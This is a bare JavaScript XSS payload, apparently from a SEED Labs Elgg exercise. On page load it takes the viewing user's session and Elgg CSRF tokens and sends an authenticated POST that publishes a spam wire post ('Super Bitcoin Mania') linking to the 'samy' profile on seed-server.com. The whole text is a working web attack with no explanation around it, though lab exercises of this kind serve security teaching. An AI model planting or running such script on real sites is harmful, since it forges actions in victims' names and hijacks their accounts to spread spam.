
<script>
    window.onload = async () => {
        if (elgg.session.user.guid != '59') await fetch("http://www.seed-server.com/action/thewire/add", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------38410652464770034393767380115",
        "Sec-GPC": "1",
        "Upgrade-Insecure-Requests": "1"
    },
    "referrer": "http://www.seed-server.com/thewire/all",
    "body": `-----------------------------38410652464770034393767380115\r\nContent-Disposition: form-data; name=\"__elgg_token\"\r\n\r\n${elgg.security.token.__elgg_token}\r\n-----------------------------38410652464770034393767380115\r\nContent-Disposition: form-data; name=\"__elgg_ts\"\r\n\r\n${elgg.security.token.__elgg_ts}\r\n-----------------------------38410652464770034393767380115\r\nContent-Disposition: form-data; name=\"body\"\r\n\r\nTo earn 12 USD/Hour(!), visit now http://www.seed-server.com/profile/samy (Super Bitcoin Mania!!!)\r\n-----------------------------38410652464770034393767380115--\r\n`,
    "method": "POST",
    "mode": "cors"
});
    };
</script>